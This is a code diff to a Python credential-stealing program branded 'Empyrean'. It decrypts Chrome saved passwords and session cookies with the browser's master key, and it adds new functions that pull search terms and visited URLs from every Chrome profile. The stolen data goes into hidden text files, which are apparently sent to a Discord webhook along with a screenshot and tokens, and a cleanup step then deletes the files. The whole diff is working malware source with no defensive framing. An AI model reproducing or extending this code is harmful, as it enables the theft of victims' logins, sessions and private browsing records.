@@ -33,13 +33,17 @@ def main(webhook: str) -> None:
     token_grabber(embed=embed)
     embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
     
-    google().grabPassword()
+    google().grabPasswords()
     google().grabCookies()
+    google().grabSearchHistory()
+    google().grabWebHistory()
     image()
     
     files = []
     files.append(File(".\\chrome-passwords.txt") if os.path.exists(".\\chrome-passwords.txt") else None)
     files.append(File(".\\chrome-cookies.txt") if os.path.exists(".\\chrome-cookies.txt") else None)
+    files.append(File(".\\chrome-search-history.txt") if os.path.exists(".\\chrome-search-history.txt") else None)
+    files.append(File(".\\chrome-web-history.txt") if os.path.exists(".\\chrome-web-history.txt") else None)
     files.append(File(".\\screenshot.png") if os.path.exists(".\\screenshot.png") else None)
     
     embed.set_author(name="Empyrean", icon_url="https://i.imgur.com/ihzoAWl.jpeg")
@@ -374,19 +378,14 @@ class google():
         except:
             return "Chrome < 80"
     
-    def grabPassword(self):
-        if os.path.exists('.\\chrome-passwords.txt'):
-            os.remove('.\\chrome-passwords.txt')
-        
-        with open('.\\chrome-passwords.txt', 'w') as f:
-            f.write('Empyrean /// Google Chrome Passwords\n\n\n')
-            hide('chrome-passwords.txt')
-            
+    def grabPasswords(self):
         appdata = os.getenv("localappdata")
-  
-        if not os.path.exists(appdata+'\\Google'):
-            return []
-  
+        
+        if os.path.exists('.\\chrome-passwords.txt'): os.remove('.\\chrome-passwords.txt')
+        with open('.\\chrome-passwords.txt', 'w') as f:  f.write('Empyrean /// Google Chrome Passwords\n\n\n')
+        hide('.\\chrome-passwords.txt')
+        if not os.path.exists(appdata+'\\Google'): return []
+        
         passwords = []
         master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
         
@@ -402,50 +401,39 @@ class google():
         used_login_dbs = []
         
         for login_db in login_dbs:
-            if not os.path.exists(login_db):
+            if os.path.exists(login_db): 
+                used_login_dbs.append(login_db)
+            else:
                 continue
             
-            used_login_dbs.append(login_db)
+            try: shutil.copy2(login_db, "Loginvault.db")
+            except FileNotFoundError: return []
             
-            try:
-                shutil.copy2(login_db, "Loginvault.db")
-            except FileNotFoundError:
-                pass
-            conn = sqlite3.connect("Loginvault.db")
-            cursor = conn.cursor()
-            try:
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                with open('.\\chrome-passwords.txt', 'a') as f:
-                    for r in cursor.fetchall():
-                        url = r[0]
-                        username = r[1]
-                        encrypted_password = r[2]
-                        decrypted_password = self.decrypt_password(encrypted_password, master_key)
-                        if url != "" and username != "" and decrypted_password != "":
-                            f.write(f'URL: {url}\nUser: {username}\nPassword: {decrypted_password}\n\n')
-            except:
-                pass
-            cursor.close()
-            conn.close()
-            try:
-                os.remove("Loginvault.db")
-            except:
-                pass
+            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
+
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            with open('.\\chrome-passwords.txt', 'a') as f:
+                for r in cursor.fetchall():
+                    url = r[0]
+                    username = r[1]
+                    encrypted_password = r[2]
+                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
+                    if url != "" and username != "" and decrypted_password != "":
+                        passwords.append(f'URL: {url}\nUser: {username}\nPassword: {decrypted_password}\n\n')
+                f.write('\n'.join(passwords))
+                
+            cursor.close(); conn.close()
+            os.remove("Loginvault.db")
         
         return passwords
 
     def grabCookies(self):
-        if os.path.exists('.\\chrome-cookies.txt'):
-            os.remove('.\\chrome-cookies.txt')
-        
-        with open('.\\chrome-cookies.txt', 'w') as f:
-            f.write('Empyrean /// Google Chrome cookies\n\n\n')
-            hide('chrome-cookies.txt')
-            
         appdata = os.getenv("localappdata")
-  
-        if not os.path.exists(appdata+'\\Google'):
-            return []
+        
+        if os.path.exists('.\\chrome-cookies.txt'): os.remove('.\\chrome-cookies.txt')
+        with open('.\\chrome-cookies.txt', 'w') as f: f.write('Empyrean /// Google Chrome Cookies\n\n\n')
+        hide('.\\chrome-cookies.txt')
+        if not os.path.exists(appdata+'\\Google'): return []
 
         cookies = []
         master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
@@ -462,38 +450,121 @@ class google():
         used_login_dbs = []
         
         for login_db in login_dbs:
-            if not os.path.exists(login_db):
+            if os.path.exists(login_db): 
+                used_login_dbs.append(login_db)
+            else:
                 continue
             
-            used_login_dbs.append(login_db)
+            try: shutil.copy2(login_db, "Loginvault.db")
+            except FileNotFoundError: return []
             
-            try:
-                shutil.copy2(login_db, "Loginvault.db")
-            except FileNotFoundError:
-                pass
-            conn = sqlite3.connect("Loginvault.db")
-            cursor = conn.cursor()
-            try:
-                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-                with open('.\\chrome-cookies.txt', 'a') as f:
-                    for r in cursor.fetchall():
-                        host = r[0]
-                        user = r[1]
-                        decrypted_cookie = self.decrypt_password(r[2], master_key)
-                        if host != "":
-                            f.write(f'Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n')
+            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
+            
+            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+            with open('.\\chrome-cookies.txt', 'a') as f:
+                for r in cursor.fetchall():
+                    host = r[0]
+                    user = r[1]
+                    decrypted_cookie = self.decrypt_password(r[2], master_key)
+                    if host != "":
+                        cookies.append(f'Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n')
+                f.write('\n'.join(cookies))
         
-            except:
-                pass
-            cursor.close()
-            conn.close()
-            try:
-                os.remove("Loginvault.db")
-            except:
-                pass	
-
+            cursor.close(); conn.close()
+            os.remove("Loginvault.db")	
+    
         return cookies
+     
+    def grabSearchHistory(self):
+        appdata = os.getenv("localappdata")
+        
+        if os.path.exists('.\\chrome-search-history.txt'): os.remove('.\\chrome-search-history.txt')
+        with open('.\\chrome-search-history.txt', 'w', encoding='utf-8') as f: f.write('Empyrean /// Google Chrome Search History\n\n\n')
+        hide('.\\chrome-search-history.txt')
+        if not os.path.exists(appdata+'\\Google'): return []
 
+        search_history = []
+        
+        login_dbs = [
+            appdata + '\\Google\\Chrome\\User Data\\Default\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\History',
+        ] 
+        
+        used_login_dbs = []
+        
+        for login_db in login_dbs:
+            if os.path.exists(login_db): 
+                used_login_dbs.append(login_db)
+            else:
+                continue
+            
+            try: shutil.copy2(login_db, "Loginvault.db")
+            except FileNotFoundError: return []
+            
+            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
+
+            cursor.execute("""SELECT term FROM keyword_search_terms""")
+            with open('.\\chrome-search-history.txt', 'a', encoding='utf-8') as f:
+                terms = []
+                for r in cursor.fetchall():
+                    if r[0] not in terms and r[0] != "":
+                        terms.append(r[0])
+                f.write('\n'.join(terms))
+            
+            cursor.close(); conn.close()
+            os.remove("Loginvault.db")
+            
+        return search_history
+    
+    def grabWebHistory(self):
+        appdata = os.getenv("localappdata")
+        
+        if os.path.exists('.\\chrome-web-history.txt'): os.remove('.\\chrome-web-history.txt')
+        with open('.\\chrome-web-history.txt', 'w', encoding='utf-8') as f: f.write('Empyrean /// Google Chrome Web History\n\n\n')
+        hide('.\\chrome-web-history.txt')
+        if not os.path.exists(appdata+'\\Google'): return []
+
+        web_history = []
+        
+        login_dbs = [
+            appdata + '\\Google\\Chrome\\User Data\\Default\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\History',
+            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\History',
+        ] 
+        
+        used_login_dbs = []
+        
+        for login_db in login_dbs:
+            if os.path.exists(login_db): 
+                used_login_dbs.append(login_db)
+            else:
+                continue
+            
+            try: shutil.copy2(login_db, "Loginvault.db")
+            except FileNotFoundError: return []
+            
+            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
+
+            cursor.execute("""SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') 
+                                    AS last_visit_time FROM urls ORDER BY last_visit_time DESC""")
+            with open('.\\chrome-web-history.txt', 'a', encoding='utf-8') as f:
+                terms = []
+                for r in cursor.fetchall():
+                    if r[0] not in terms and r[0] != "":
+                        terms.append(r[0])
+                f.write('\n'.join(terms))
+            
+            cursor.close(); conn.close()
+            os.remove("Loginvault.db")
+            
+        return web_history
 class systemspec():
     def sys_spec():
         sys_spec = f"""
@@ -594,6 +665,8 @@ def cleanup():
     possible_files = [
         '.\\chrome-passwords.txt',
         '.\\chrome-cookies.txt',
+        '.\\chrome-search-history.txt',
+        '.\\chrome-web-history.txt',
         '.\\screenshot.png'
     ]
     for file in possible_files:
